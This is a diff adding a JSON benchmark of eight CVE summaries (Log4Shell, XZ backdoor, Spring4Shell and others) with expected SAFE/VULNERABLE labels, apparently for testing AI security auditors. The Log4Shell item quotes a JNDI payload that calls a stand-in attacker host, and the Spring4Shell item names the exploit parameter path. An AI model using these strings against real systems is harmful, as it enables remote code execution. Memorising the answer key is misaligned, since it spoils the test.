@@ -1,0 +1,57 @@
+{
+  "id": "cve_real_vulnerabilities",
+  "name": "Official Real CVE Vulnerabilities (cve.org)",
+  "description": "Official Real-World Common Vulnerabilities and Exposures (CVE) database records fetched directly from cve.org and MITRE CVE AWG API.",
+  "task_description": "Evaluate real CVE vulnerability records and patched enterprise code snippets against official cve.org specifications.",
+  "seed_prompt": "You are a Senior Vulnerability Security Auditor. Review the official CVE technical record or code snippet below and state whether it is SAFE or VULNERABLE.",
+  "test_cases": [
+    {
+      "id": "CVE-2021-44228",
+      "input": "Official cve.org Record (CVE-2021-44228 - Log4Shell):\nApache Log4j2 versions 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled: '${jndi:ldap://attacker.com/a}'.",
+      "expected_status": "VULNERABLE",
+      "expected_category": "Remote Code Execution (RCE) / JNDI Injection"
+    },
+    {
+      "id": "CVE-2024-3094",
+      "input": "Official cve.org Record (CVE-2024-3094 - XZ Utils Backdoor):\nMalicious code was discovered in the upstream tarballs of xz-utils starting with version 5.6.0. Through a series of complex obfuscated build scripts, the liblzma build process extracts a prebuilt object file from a disguised test file, which intercepts RSA decryption functions in OpenSSH sshd during systemd initialization.",
+      "expected_status": "VULNERABLE",
+      "expected_category": "Supply Chain Backdoor / Authentication Bypass"
+    },
+    {
+      "id": "CVE-2023-38606",
+      "input": "Official cve.org Record (CVE-2023-38606 - Operation Triangulation):\nApple iOS and macOS kernel vulnerability prior to iOS 16.6 and macOS 13.5. An attacker with physical or remote memory access can manipulate unmapped hardware MMIO registers to bypass ARM Page Table Security (PPL) state management without proper bounds validation.",
+      "expected_status": "VULNERABLE",
+      "expected_category": "Kernel Memory Corruption / Privilege Escalation"
+    },
+    {
+      "id": "CVE-2022-22965",
+      "input": "Official cve.org Record (CVE-2022-22965 - Spring4Shell):\nA Spring MVC or Spring WebFlux application running on JDK 9+ is vulnerable to Remote Code Execution (RCE) via data binding. An HTTP request parameter binding to 'class.module.classLoader.resources.context.parent.pipeline.first.pattern' allows unauthenticated attackers to write arbitrary JSP webshell files to the web root.",
+      "expected_status": "VULNERABLE",
+      "expected_category": "Class Loader Data Binding / Webshell RCE"
+    },
+    {
+      "id": "CVE-2023-4863",
+      "input": "Official cve.org Record (CVE-2023-4863 - Libwebp Heap Overflow):\nHeap buffer overflow in libwebp in Google Chrome prior to 116.0.5845.187 and libwebp 1.3.2 allows a remote attacker to execute arbitrary code or trigger a denial of service via a crafted WebP lossless image containing malformed Huffman coding tables.",
+      "expected_status": "VULNERABLE",
+      "expected_category": "Heap Buffer Overflow / Memory Corruption"
+    },
+    {
+      "id": "CVE-2021-3156",
+      "input": "Official cve.org Record (CVE-2021-3156 - Sudo Baron Samedit):\nSudo before version 1.9.5p2 contains an off-by-one error when parsing command line arguments in shell mode ('sudoedit -s'). Unescaped backslash characters at the end of command arguments result in heap-based buffer overflow, granting root privilege escalation.",
+      "expected_status": "VULNERABLE",
+      "expected_category": "Local Privilege Escalation (LPE)"
+    },
+    {
+      "id": "CVE-2021-44228-FIX",
+      "input": "Official cve.org Security Release Fix (Apache Log4j 2.17.0):\nIn Apache Log4j 2.17.0, JNDI lookup support is completely disabled by default ('log4j2.enableJndiLookup=false'), message lookup substitution syntax '${jndi:...}' is removed from logging context, and LDAP class loading protocol handlers are hard-disabled.",
+      "expected_status": "SAFE",
+      "expected_category": "Patched Security Release"
+    },
+    {
+      "id": "CVE-2023-38606-FIX",
+      "input": "Official cve.org Patch Verification (Apple macOS 12.6.8 / iOS 15.7.8):\nState management validation logic updated in Apple Kernel. Unmapped MMIO register ranges are strictly checked against physical memory range bounds, and PPL page table permissions are locked against dynamic modification.",
+      "expected_status": "SAFE",
+      "expected_category": "Patched Security Release"
+    }
+  ]
+}
